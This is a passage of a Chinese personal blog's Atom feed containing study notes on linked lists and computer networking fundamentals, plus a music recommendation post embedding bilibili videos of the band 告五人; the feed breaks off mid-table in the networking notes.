<?xml version="1.0" encoding="utf-8"?>


<feed xmlns="http://www.w3.org/2005/Atom" xml:lang="zh-CN">
    <title type="text">falcone&#39;s sweet home</title>
    <subtitle type="html">MemE 是一个强大且可高度定制的 GoHugo 博客主题，专为个人博客设计。</subtitle>
    <updated>2024-01-21T21:16:17&#43;08:00</updated>
    <id>https://xuoneyuan.github.io/</id>
    <link rel="alternate" type="text/html" href="https://xuoneyuan.github.io/" />
    <link rel="self" type="application/atom&#43;xml" href="https://xuoneyuan.github.io/atom.xml" />
    <author>
            <name>falcone</name>
            <uri>https://xuoneyuan.github.io/</uri>
            
                <email>xuoneyuan@gmail.com</email>
            </author>
    <rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</rights>
    <generator uri="https://gohugo.io/" version="0.120.3">Hugo</generator>
        <entry>
            <title type="text">数据结构</title>
            <link rel="alternate" type="text/html" href="https://xuoneyuan.github.io/posts/14/" />
            <id>https://xuoneyuan.github.io/posts/14/</id>
            <updated>2024-01-21T21:16:09&#43;08:00</updated>
            <published>2024-01-21T19:47:55&#43;08:00</published>
            <author>
                    <name>falcone</name>
                    <uri>https://xuoneyuan.github.io/</uri>
                    <email>xuoneyuan@gmail.com</email>
                    </author>
            <rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</rights><summary type="html">线性表 线性表的基本概念与实现 线性表的定义 线性表是具有相同特性数据元素的一个有限序列 线……</summary>
            
                <content type="html">&lt;h2 id=&#34;线性表&#34;&gt;线性表&lt;/h2&gt;
&lt;h3 id=&#34;线性表的基本概念与实现&#34;&gt;线性表的基本概念与实现&lt;/h3&gt;
&lt;h4 id=&#34;线性表的定义&#34;&gt;线性表的定义&lt;/h4&gt;
&lt;p&gt;线性表是具有相同特性数据元素的一个有限序列&lt;/p&gt;
&lt;h4 id=&#34;线性表的存储结构&#34;&gt;线性表的存储结构&lt;/h4&gt;
&lt;p&gt;线性表的存储结构有顺序存储结构和链式存储结构两种。前者称为顺序表，后者称为链表&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;顺序表&lt;br&gt;
顺序表就是把线性表中的所有元素按照其逻辑顺序，依次存储到从指定的存储位置开始的一块连续的存储空间中。线性表中第一个元素的存储位置就是指定的存储位置，第i+1个元素的存储位置紧接在第i个元素的存储位置的后面&lt;/li&gt;
&lt;li&gt;链表&lt;br&gt;
在链表存储中，每个结点不仅包含所存元素的信息，还包含元素之间逻辑关系的信息，如单链表中前驱结点包含了后继结点的地址信息，这样就可以通过前驱结点中的地址信息找到后继结点的位置。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;链表有以下5种形式&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;单链表&lt;br&gt;
在每个结点中除了包含数据域外，还包含一个指针域，用以指向其后继结点。
&lt;img src=&#34;https://xuoneyuan.github.io/images/lb1.png&#34; alt=&#34;1&#34;&gt;
①带头结点的单链表中，头指针head指向头结点，头结点的值域不含任何信息，从头结点的后继结点开始存储数据信息。头指针head始终不等于NULL，当head-&amp;gt;next 等于NULL时，链表为空。&lt;br&gt;
②不带头结点的单链表中的头指针head直接指向开始结点，即图中的结点A1，当head等于NULL时，链表为空。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;总之，两者最明显的区别是，带头结点的单链表中有一个结点不存储信息（仅存储一些描述链表属性的信息，如表长)，只是作为标志，而不带头结点的单链表的所有结点都存储信息。&lt;/p&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;
&lt;p&gt;双链表
双链表就是在单链表结点上增添了一个指针域，指向当前结点的前驱。这样就可以方便地由其后继来找到其前驱，从而实现输出从终端结点到开始结点的数据序列。
&lt;img src=&#34;https://xuoneyuan.github.io/images/lb2.png&#34; alt=&#34;1&#34;&gt;
同样，双链表也分为带头结点的双链表和不带头结点的双链表，情况类似于单链表。带头结点的双链表，当head-&amp;gt;next为NULL时，链表为空;不带头结点的双链表，当head为NULL时，链表为空。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;循环单链表&lt;br&gt;
将单链表的最后一个指针域(空指针）指向链表中的第一个结点即可
&lt;img src=&#34;https://xuoneyuan.github.io/images/lb3.png&#34; alt=&#34;1&#34;&gt;
带头结点的循环单链表，当head等于head-&amp;gt;next时，链表为空；不带头结点的循环单链表，当head等于NULL时，链表为空。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;循环双链表&lt;br&gt;
将终端结点的next指针指向链表中的第一个结点，将链表中第一个结点的 prior指针指向终端结点。&lt;br&gt;
当head等于NULL时，不带头结点的循环双链表为空。带头结点的循环双链表中是没有空指针的，其空状态下，head-&amp;gt;next和 head-&amp;gt;prior必然都等于head。所以判断其是否为空，只需要检查head-&amp;gt;next和 head-&amp;gt;prior两个指针中的任意一个是否等于head指针即可。因此，以下四句代码中的任意-句为真，都可以判断循环双链表为空。&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;head-&amp;gt;next == head;
head-&amp;gt;prior == head;
head-&amp;gt;next == head &amp;amp;&amp;amp; head-&amp;gt;prior == head;
head-&amp;gt;next == head || head-&amp;gt;prior == head;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://xuoneyuan.github.io/images/lb4.png&#34; alt=&#34;1&#34;&gt;
5) 静态链表&lt;br&gt;
静态链表借助一维数组来表示
&lt;img src=&#34;https://xuoneyuan.github.io/images/lb5.png&#34; alt=&#34;1&#34;&gt;
左图是静态链表，右图是其对应的一般链表。一般链表结点空间来自于整个内存，静态链表则来自于一个结构体数组。数组中的每一个结点含有两个分量:一个是数据元素分量 data;另一个是指针分量,指示了当前结点的直接后继结点在数组中的位置(这和一般链表中next指针的地位是同等的)。&lt;/p&gt;
</content>
            
            
            
            
            
                
                    
                        
                            
                            
                            
                                <category scheme="https://xuoneyuan.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" term="计算机基础知识" label="计算机基础知识" />
                            
                        
                    
                
                    
                        
                            
                            
                            
                                <category scheme="https://xuoneyuan.github.io/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA/" term="计算机" label="计算机" />
                            
                        
                            
                            
                            
                                <category scheme="https://xuoneyuan.github.io/tags/408/" term="408" label="408" />
                            
                        
                    
                
            
        </entry>
    
        <entry>
            <title type="text">falconeの音乐时光——告五人篇</title>
            <link rel="alternate" type="text/html" href="https://xuoneyuan.github.io/posts/13/" />
            <id>https://xuoneyuan.github.io/posts/13/</id>
            <updated>2023-12-30T23:24:59&#43;08:00</updated>
            <published>2023-12-30T23:08:18&#43;08:00</published>
            <author>
                    <name>falcone</name>
                    <uri>https://xuoneyuan.github.io/</uri>
                    <email>xuoneyuan@gmail.com</email>
                    </author>
            <rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</rights><summary type="html">其实告五人很多歌都很好听的，有些冷门歌曲有时间听还是不错的 几首很火的歌就没啥推荐了，……</summary>
            
                <content type="html">&lt;p&gt;其实告五人很多歌都很好听的，有些冷门歌曲有时间听还是不错的&lt;/p&gt;
&lt;p&gt;几首很火的歌就没啥推荐了，比如《唯一》、《给你一瓶魔法药水》、《爱人错过》都是些烂大街的歌曲了
&lt;img src=&#34;https://xuoneyuan.github.io/images/xdyj.jpg&#34; alt=&#34;xidian&#34; title=&#34;Merry Christmas, Xidian University!&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;告五人&#34;&gt;告五人&lt;/h3&gt;
&lt;h4 id=&#34;带我去找夜生活&#34;&gt;《带我去找夜生活》&lt;/h4&gt;




&lt;div&gt;&lt;iframe id=&#34;biliplayer&#34; src=&#34;https://xuoneyuan.github.io//player.bilibili.com/player.html?bvid=BV1yX4y1P7Kd&amp;page=1&#34; scrolling=&#34;no&#34; border=&#34;0&#34; frameborder=&#34;no&#34; framespacing=&#34;0&#34; allowfullscreen=&#34;true&#34; loading=&#34;lazy&#34; &gt; &lt;/iframe&gt;&lt;/div&gt;

&lt;style&gt;
    
    #biliplayer {
      width: 100%;
      height: 550px;
    }
    @media only screen and (min-device-width: 320px) and (max-device-width: 480px) {
      #biliplayer {
        width: 100%;
        height: 250px;
      }
    }
    &lt;/style&gt;
    
&lt;h4 id=&#34;温蒂公主的侍卫&#34;&gt;《温蒂公主的侍卫》&lt;/h4&gt;




&lt;div&gt;&lt;iframe id=&#34;biliplayer&#34; src=&#34;https://xuoneyuan.github.io//player.bilibili.com/player.html?bvid=BV1WG411g7C5&amp;page=1&#34; scrolling=&#34;no&#34; border=&#34;0&#34; frameborder=&#34;no&#34; framespacing=&#34;0&#34; allowfullscreen=&#34;true&#34; loading=&#34;lazy&#34; &gt; &lt;/iframe&gt;&lt;/div&gt;

&lt;style&gt;
    
    #biliplayer {
      width: 100%;
      height: 550px;
    }
    @media only screen and (min-device-width: 320px) and (max-device-width: 480px) {
      #biliplayer {
        width: 100%;
        height: 250px;
      }
    }
    &lt;/style&gt;
    
&lt;h4 id=&#34;法兰西多士&#34;&gt;《法兰西多士》&lt;/h4&gt;




&lt;div&gt;&lt;iframe id=&#34;biliplayer&#34; src=&#34;https://xuoneyuan.github.io//player.bilibili.com/player.html?bvid=BV17r4y1M7pR&amp;page=1&#34; scrolling=&#34;no&#34; border=&#34;0&#34; frameborder=&#34;no&#34; framespacing=&#34;0&#34; allowfullscreen=&#34;true&#34; loading=&#34;lazy&#34; &gt; &lt;/iframe&gt;&lt;/div&gt;

&lt;style&gt;
    
    #biliplayer {
      width: 100%;
      height: 550px;
    }
    @media only screen and (min-device-width: 320px) and (max-device-width: 480px) {
      #biliplayer {
        width: 100%;
        height: 250px;
      }
    }
    &lt;/style&gt;
    
&lt;p&gt;其实告五人还有很多歌曲也很好听，包括但不仅限于《好不容易》、《说我爱你的一百种方式》、《爱在夏天》、《披星戴月的想你》、《我想要占据你》、《红》、《与海无关》、《丑人多作怪》、《在这座城市遗失了你》、《从没去过巴塞隆纳》、《在未来的你跟我说声嗨》、《又到天黑》、《一念之间》、《不具名的花》、《我以为你不会出现》等等&lt;/p&gt;
</content>
            
            
            
            
            
                
                    
                        
                            
                            
                            
                                <category scheme="https://xuoneyuan.github.io/categories/%E9%9F%B3%E4%B9%90/" term="音乐" label="音乐" />
                            
                        
                    
                
                    
                        
                            
                            
                            
                                <category scheme="https://xuoneyuan.github.io/tags/%E9%9F%B3%E4%B9%90/" term="音乐" label="音乐" />
                            
                        
                            
                            
                            
                                <category scheme="https://xuoneyuan.github.io/tags/bilibili/" term="bilibili" label="bilibili" />
                            
                        
                    
                
            
        </entry>
    
        <entry>
            <title type="text">计算机网络</title>
            <link rel="alternate" type="text/html" href="https://xuoneyuan.github.io/posts/11/" />
            <id>https://xuoneyuan.github.io/posts/11/</id>
            <updated>2023-12-30T23:04:40&#43;08:00</updated>
            <published>2023-12-25T14:56:10&#43;08:00</published>
            <author>
                    <name>falcone</name>
                    <uri>https://xuoneyuan.github.io/</uri>
                    <email>xuoneyuan@gmail.com</email>
                    </author>
            <rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</rights><summary type="html">计算机网络体系结构 计算机网络概述 计算机网络的概念 计算机网络就是一些互联的、自治的计算……</summary>
            
                <content type="html">&lt;h2 id=&#34;计算机网络体系结构&#34;&gt;计算机网络体系结构&lt;/h2&gt;
&lt;h3 id=&#34;计算机网络概述&#34;&gt;计算机网络概述&lt;/h3&gt;
&lt;h4 id=&#34;计算机网络的概念&#34;&gt;计算机网络的概念&lt;/h4&gt;
&lt;p&gt;计算机网络就是一些互联的、自治的计算机系统的集合&lt;/p&gt;
&lt;h4 id=&#34;计算机网络的组成&#34;&gt;计算机网络的组成&lt;/h4&gt;
&lt;h5 id=&#34;物理组成&#34;&gt;物理组成&lt;/h5&gt;
&lt;p&gt;包括硬件、软件、协议三大部分&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;硬件：由主机、通信处理机、通信线路和交换设备组成&lt;/li&gt;
&lt;li&gt;软件：主要包括实现资源共享的软件和方便用户使用的各种工具软件&lt;/li&gt;
&lt;li&gt;协议：数据在线路上传输需要遵循一定的规则&lt;/li&gt;
&lt;/ol&gt;
&lt;h5 id=&#34;工作方式组成&#34;&gt;工作方式组成&lt;/h5&gt;
&lt;p&gt;可分为边缘部分和核心部分&lt;/p&gt;
&lt;h5 id=&#34;功能组成&#34;&gt;功能组成&lt;/h5&gt;
&lt;p&gt;可分为&lt;strong&gt;通信子网&lt;/strong&gt;和&lt;strong&gt;资源子网&lt;/strong&gt;两部分&lt;/p&gt;
&lt;h4 id=&#34;计算机网络的功能&#34;&gt;计算机网络的功能&lt;/h4&gt;
&lt;h4 id=&#34;计算机网络的分类&#34;&gt;计算机网络的分类&lt;/h4&gt;
&lt;h4 id=&#34;计算机网络主要性能指标&#34;&gt;计算机网络主要性能指标&lt;/h4&gt;
&lt;h5 id=&#34;时延&#34;&gt;时延&lt;/h5&gt;
&lt;ol&gt;
&lt;li&gt;发送时延，也称为传输时延&lt;br&gt;
主机或路由器发送数据帧所需要的时间&lt;br&gt;
发送时延 = 数据帧长度 (bit) / 发送速率 (bit/s)&lt;/li&gt;
&lt;li&gt;传播时延&lt;br&gt;
传播时延 = 信道长度 (m) / 电磁波在信道上的传播速度 （m/s)&lt;/li&gt;
&lt;li&gt;处理时延&lt;/li&gt;
&lt;li&gt;排队时延&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;strong&gt;总时延 = 发送时延 + 传播时延 + 处理时延 + 排队时延&lt;/strong&gt;



&lt;div class=&#34;notice notice-info&#34; &gt;
    &lt;div class=&#34;notice-title&#34;&gt;&lt;svg xmlns=&#34;http://www.w3.org/2000/svg&#34; class=&#34;icon notice-icon&#34; viewBox=&#34;0 0 512 512&#34;&gt;&lt;path d=&#34;M256 8a248 248 0 100 496 248 248 0 000-496zm0 110a42 42 0 110 84 42 42 0 010-84zm56 254c0 7-5 12-12 12h-88c-7 0-12-5-12-12v-24c0-7 5-12 12-12h12v-64h-12c-7 0-12-5-12-12v-24c0-7 5-12 12-12h64c7 0 12 5 12 12v100h12c7 0 12 5 12 12v24z&#34;/&gt;&lt;/svg&gt;&lt;/div&gt;&lt;p&gt;一般排队时延和处理时延忽略不计&lt;br&gt;
对于高速网络链路，提高的是数据发送速率不是比特在链路上的传播速度&lt;/p&gt;&lt;/div&gt;
&lt;/p&gt;
&lt;h5 id=&#34;时延带宽积&#34;&gt;时延带宽积&lt;/h5&gt;
&lt;p&gt;又称为以比特为单位的链路长度&lt;br&gt;
&lt;strong&gt;时延带宽积 = 传播时延 * 带宽&lt;/strong&gt;&lt;/p&gt;
&lt;h5 id=&#34;往返时间&#34;&gt;往返时间&lt;/h5&gt;
&lt;p&gt;从发送方发送数据开始，到发送方收到来自接收方的确认消息总共经历的时间&lt;/p&gt;
&lt;h5 id=&#34;利用率&#34;&gt;利用率&lt;/h5&gt;
&lt;p&gt;包括信道利用率和网络利用率&lt;/p&gt;
&lt;h3 id=&#34;计算机网络体系结构与参考模型&#34;&gt;计算机网络体系结构与参考模型&lt;/h3&gt;
&lt;h4 id=&#34;计算机网络分层结构&#34;&gt;计算机网络分层结构&lt;/h4&gt;
&lt;h4 id=&#34;协议&#34;&gt;协议&lt;/h4&gt;
&lt;h4 id=&#34;接口&#34;&gt;接口&lt;/h4&gt;
&lt;p&gt;又称为服务访问点，从物理层开始每一层都向上层提供服务访问点，没有接口就不能提供服务&lt;/p&gt;
&lt;h4 id=&#34;服务&#34;&gt;服务&lt;/h4&gt;
&lt;p&gt;指下层为相邻上层提供的功能调用&lt;/p&gt;
&lt;h4 id=&#34;isoosi参考模型和tcpip参考模型&#34;&gt;ISO/OSI参考模型和TCP/IP参考模型&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;5层结构的总结&lt;/li&gt;
&lt;/ol&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;层次&lt;/th&gt;
&lt;th&gt;描述&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;应用层（用户对用户）&lt;/td&gt;
&lt;td&gt;任务：提供系统与用户的接口&lt;br&gt;功能：文件传输、访问和管理、电子邮件服务&lt;br&gt;协议：FTP、SMTP、HTTP&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;传输层（应用对应用 进程对进程）&lt;/td&gt;
&lt;td&gt;传输单位：报文段(TCP)或用户数据报(UDP)&lt;br&gt;任务：负责两个进程之间的通信&lt;br&gt;功能：为端到端连接提供可靠的传输服务和管理服务&lt;br&gt;协议：TCP、UDP、ARQ&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;网络层（主机对主机）&lt;/td&gt;
&lt;td&gt;传输单位：数据报&lt;br&gt;所实现的硬件：路由器&lt;br&gt;任务：将传输层传下来的报文段封装成分组；选择适当的路由使得传输层传下来的分组能够交付到目的主机&lt;br&gt;功能：为传输层提供服务；组包和拆包；路由选择；拥塞控制&lt;br&gt;协议：ICMP、ARP、RAP、IP&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;数据链路层&lt;/td&gt;
&lt;td&gt;传输单位：帧&lt;br&gt;所实现的硬件：交换机、网桥&lt;br&gt;任务：将网络层传下来的IP数据报组装成帧&lt;br&gt;功能：链路连接的建立、拆除、分离；帧定界和帧同步；差错检测&lt;br&gt;协议：PPP、HDLC&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;物理层&lt;/td&gt;
&lt;td&gt;传输单位：比特&lt;br&gt;所实现的硬件：集线器、中继器&lt;br&gt;任务：透明地传输比特流&lt;br&gt;功能：为数据端设备提供传送数据通路&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;


&lt;div class=&#34;notice notice-tip&#34; &gt;
    &lt;div class=&#34;notice-title&#34;&gt;&lt;svg xmlns=&#34;http://www.w3.org/2000/svg&#34; class=&#34;icon notice-icon&#34; viewBox=&#34;0 0 512 512&#34;&gt;&lt;path d=&#34;M504 256a248 248 0 11-496 0 248 248 0 01496 0zM227 387l184-184c7-6 7-16 0-22l-22-23c-7-6-17-6-23 0L216 308l-70-70c-6-6-16-6-23 0l-22 23c-7 6-7 16 0 22l104 104c6 7 16 7 22 0z&#34;/&gt;&lt;/svg&gt;&lt;/div&gt;&lt;p&gt;补充知识&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;会话层&lt;br&gt;
会话层的主要功能是在两个节点间建立、维护和释放面向用户的连接，并对会话进行管理和控制，保证会话数据可靠传送\&lt;/li&gt;
&lt;li&gt;表示层&lt;br&gt;
表示层负责处理在两个内部数据表示结构不同的通信系统间交换信息的表示格式，为数据加密和解密以及为提高传输效率提供必需的数据压缩及解压等功能&lt;/li&gt;
&lt;/ol&gt;&lt;/div&gt;

2. OSI参考模型和TCP/IP模型的区别&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;OSI参考模型&lt;/th&gt;
&lt;th&gt;TCP/IP模型&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;3个主要概念：服务、接口、协议&lt;/td&gt;
&lt;td&gt;没有明确区分服务、接口、协议&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;协议有很好的隐藏性&lt;/td&gt;
&lt;td&gt;产生在协议发明之后&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;产生在协议发明之前&lt;/td&gt;
&lt;td&gt;共有4层&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;共有7层&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;网络层：连接和无连接&lt;/td&gt;
&lt;td&gt;网络层：仅有无连接&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;传输层：仅有面向连接&lt;/td&gt;
&lt;td&gt;传输层：面向连接和无连接&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;&lt;strong&gt;TCP/IP模型是4层模型(应用层、传输层、网络层、网络接口层)&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;TCP/IP模型的网络层提供的是无连接不可靠的数据报服务&lt;/strong&gt;&lt;/p&gt;



&lt;div class=&#34;notice notice-warning&#34; &gt;
    &lt;div class=&#34;notice-title&#34;&gt;&lt;svg xmlns=&#34;http://www.w3.org/2000/svg&#34; class=&#34;icon notice-icon&#34; viewBox=&#34;0 0 576 512&#34;&gt;&lt;path d=&#34;M570 440c18 32-5 72-42 72H48c-37 0-60-40-42-72L246 24c19-32 65-32 84 0l240 416zm-282-86a46 46 0 100 92 46 46 0 000-92zm-44-165l8 136c0 6 5 11 12 11h48c7 0 12-5 12-11l8-136c0-7-5-13-12-13h-64c-7 0-12 6-12 13z&#34;/&gt;&lt;/svg&gt;&lt;/div&gt;&lt;p&gt;物理层是不参与封装的，物理层以0、1比特流的形式透明地传输数据链路层递交的帧。网络层、应用层都把上层递交的数据加上首部，数据链路层在接收上层递交的数据时不但要给其加上首部，还要加上尾部&lt;/p&gt;&lt;/div&gt;

&lt;h2 id=&#34;物理层&#34;&gt;物理层&lt;/h2&gt;
&lt;h3 id=&#34;通信基础&#34;&gt;通信基础&lt;/h3&gt;
&lt;h4 id=&#34;信号&#34;&gt;信号&lt;/h4&gt;
&lt;p&gt;信号：数据的电气或电磁的表现，数据是传送信息的实体



&lt;div class=&#34;notice notice-note&#34; &gt;
    &lt;div class=&#34;notice-title&#34;&gt;&lt;svg xmlns=&#34;http://www.w3.org/2000/svg&#34; class=&#34;icon notice-icon&#34; viewBox=&#34;0 0 512 512&#34;&gt;&lt;path d=&#34;M504 256a248 248 0 11-496 0 248 248 0 01496 0zm-248 50a46 46 0 100 92 46 46 0 000-92zm-44-165l8 136c0 6 5 11 12 11h48c7 0 12-5 12-11l8-136c0-7-5-13-12-13h-64c-7 0-12 6-12 13z&#34;/&gt;&lt;/svg&gt;&lt;/div&gt;&lt;ol&gt;
&lt;li&gt;无论数据或信号，都既可以是模拟的，也可以是数字的&lt;/li&gt;
&lt;li&gt;信道上传送的信号分为基带信号和宽带信号。基带对应数字信号，宽带对应模拟信号&lt;/li&gt;
&lt;li&gt;宽带传输可以等同于频带传输，只是宽带传输有更多的子信道&lt;/li&gt;
&lt;/ol&gt;&lt;/div&gt;
&lt;/p&gt;
&lt;h4 id=&#34;信源信道及信宿&#34;&gt;信源、信道及信宿&lt;/h4&gt;



&lt;div class=&#34;notice notice-note&#34; &gt;
    &lt;div class=&#34;notice-title&#34;&gt;&lt;svg xmlns=&#34;http://www.w3.org/2000/svg&#34; class=&#34;icon notice-icon&#34; viewBox=&#34;0 0 512 512&#34;&gt;&lt;path d=&#34;M504 256a248 248 0 11-496 0 248 248 0 01496 0zm-248 50a46 46 0 100 92 46 46 0 000-92zm-44-165l8 136c0 6 5 11 12 11h48c7 0 12-5 12-11l8-136c0-7-5-13-12-13h-64c-7 0-12 6-12 13z&#34;/&gt;&lt;/svg&gt;&lt;/div&gt;&lt;ol&gt;
&lt;li&gt;数据传输方式分为串行传输和并行传输&lt;/li&gt;
&lt;li&gt;通信方式分为同步通信(接收端时钟频率和发送端时钟频率相等)和异步通信&lt;/li&gt;
&lt;li&gt;通信模式分为单工、半双工、全双工&lt;/li&gt;
&lt;/ol&gt;&lt;/div&gt;

&lt;h4 id=&#34;速率波特及码元&#34;&gt;速率、波特及码元&lt;/h4&gt;
&lt;p&gt;波特率：表示单位时间内数字通信系统所传输的二进制码元个数(也可称为脉冲个数或者信号变化的次数)，单位是波特(Baud)，1波特表示数字通信系统每秒传输1个码元&lt;br&gt;
比特率：表示单位时间内数字通信系统所传输的二进制码元个数，即比特数，单位为bit/s&lt;br&gt;
正常情况下，每比特只能表示两种信号变化(0或1)，可看成二进制。但是一个码元仅携带一个比特数据率很低，所以通过一些手段将信号的变化次数增加，从而让一个码元携带更多的比特。例如增加到16种信号变化(可看成十六进制)，那么需要4bit(log&lt;sub&gt;2&lt;/sub&gt;16 = 4)来表示，此时一个码元携带了4bit&lt;/p&gt;
&lt;h4 id=&#34;带宽&#34;&gt;带宽&lt;/h4&gt;
&lt;p&gt;传统定义：通信线路允许通过的信号频带范围，就是允许通过的最高频率减去最低频率&lt;br&gt;
但是在计算机网络中，带宽是用来表示网络的通信线路所能传送数据的能力&lt;/p&gt;
&lt;h4 id=&#34;奈奎斯特定理&#34;&gt;奈奎斯特定理&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;采样定理
假设原始信号中最大频率为f，那么采样频率f&lt;sub&gt;采样&lt;/sub&gt;必须大于或等于最大频率f的两倍，才能保证采样后的数字信号完整保留原始模拟信号的信息&lt;/li&gt;
&lt;li&gt;奈奎斯特定理
怎么寻找在保证不出现码间串扰的条件下码元传输速率的最大值？奈奎斯特在采样定理和无噪声的基础上，提出了奈奎斯特定理：&lt;br&gt;
C&lt;sub&gt;max&lt;/sub&gt;=f&lt;sub&gt;采样&lt;/sub&gt;*log&lt;sub&gt;2&lt;/sub&gt;N=2f * log&lt;sub&gt;2&lt;/sub&gt;N (bit/s)&lt;br&gt;
其中f表示理想低通信道的带宽；N表示每个码元的离散电平的数目



&lt;div class=&#34;notice notice-info&#34; &gt;
    &lt;div class=&#34;notice-title&#34;&gt;&lt;svg xmlns=&#34;http://www.w3.org/2000/svg&#34; class=&#34;icon notice-icon&#34; viewBox=&#34;0 0 512 512&#34;&gt;&lt;path d=&#34;M256 8a248 248 0 100 496 248 248 0 000-496zm0 110a42 42 0 110 84 42 42 0 010-84zm56 254c0 7-5 12-12 12h-88c-7 0-12-5-12-12v-24c0-7 5-12 12-12h12v-64h-12c-7 0-12-5-12-12v-24c0-7 5-12 12-12h64c7 0 12 5 12 12v100h12c7 0 12 5 12 12v24z&#34;/&gt;&lt;/svg&gt;&lt;/div&gt;&lt;p&gt;奈奎斯特定理仅给出了在无噪声情况下码元的最大传输速率(2f)，并没有给出最大数据传输率，只要N足够大，最大数据传输速率C&lt;sub&gt;max&lt;/sub&gt;就可以无穷大&lt;/p&gt;&lt;/div&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h4 id=&#34;香农定理&#34;&gt;香农定理&lt;/h4&gt;
&lt;p&gt;&lt;strong&gt;信噪比(dB)=10log&lt;sub&gt;10&lt;/sub&gt;(S/N) (dB)&lt;/strong&gt;&lt;br&gt;
引入信噪比之后可得出香农公式为&lt;br&gt;
&lt;strong&gt;C&lt;sub&gt;max&lt;/sub&gt;=W*log&lt;sub&gt;2&lt;/sub&gt;(1+S/N) (bit/s)&lt;/strong&gt; &lt;br&gt;
W为信道的带宽，想要提高最大数据传输速率，应该设法提高带宽或者信噪比&lt;/p&gt;
&lt;h4 id=&#34;编码与调制&#34;&gt;编码与调制&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;调制&lt;br&gt;
数字数据调制为模拟信号：带通调制、基带调制&lt;/li&gt;
&lt;li&gt;编码&lt;br&gt;
数字数据编码为数字信号&lt;br&gt;
非归零码(NRZ):用低电平表示0，高电平表示1&lt;br&gt;
曼彻斯特编码：将每个码元分成两个相等的间隔，前一个间隔为高电平而后一个间隔为低电平表示码元1，码元0正好相反&lt;br&gt;
差分曼彻斯特编码：若码元为1，则其前半个码元的电平与上一个码元的后半个码元的电平一样；若码元为0，则其前半个码元的电平与上一个码元的后半个码元的电平相反&lt;/li&gt;
&lt;/ol&gt;
&lt;h4 id=&#34;数据传输方式&#34;&gt;数据传输方式&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;电路交换&lt;br&gt;
电路交换在通信之前要在通信双方之间建立一条被双方独占的物理通路&lt;/li&gt;
&lt;li&gt;报文交换&lt;br&gt;
数据交换的单位是报文，报文携带有目的地址、源地址等信息，在交换节点采用存储转发的传输方式&lt;/li&gt;
&lt;li&gt;分组交换&lt;br&gt;
分组交换仍采用存储转发传输方式，但将一个长报文先分割为若干个较短的分组，然后把这些分组逐个地发送出去&lt;/li&gt;
&lt;/ol&gt;



&lt;div class=&#34;notice notice-info&#34; &gt;
    &lt;div class=&#34;notice-title&#34;&gt;&lt;svg xmlns=&#34;http://www.w3.org/2000/svg&#34; class=&#34;icon notice-icon&#34; viewBox=&#34;0 0 512 512&#34;&gt;&lt;path d=&#34;M256 8a248 248 0 100 496 248 248 0 000-496zm0 110a42 42 0 110 84 42 42 0 010-84zm56 254c0 7-5 12-12 12h-88c-7 0-12-5-12-12v-24c0-7 5-12 12-12h12v-64h-12c-7 0-12-5-12-12v-24c0-7 5-12 12-12h64c7 0 12 5 12 12v100h12c7 0 12 5 12 12v24z&#34;/&gt;&lt;/svg&gt;&lt;/div&gt;&lt;p&gt;电路交换一定是面向连接的，分组交换存在面向连接和无连接两种情况&lt;/p&gt;&lt;/div&gt;

&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;比较标准&lt;/th&gt;
&lt;th&gt;电路交换&lt;/th&gt;
&lt;th&gt;分组交换&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;建立连接&lt;/td&gt;
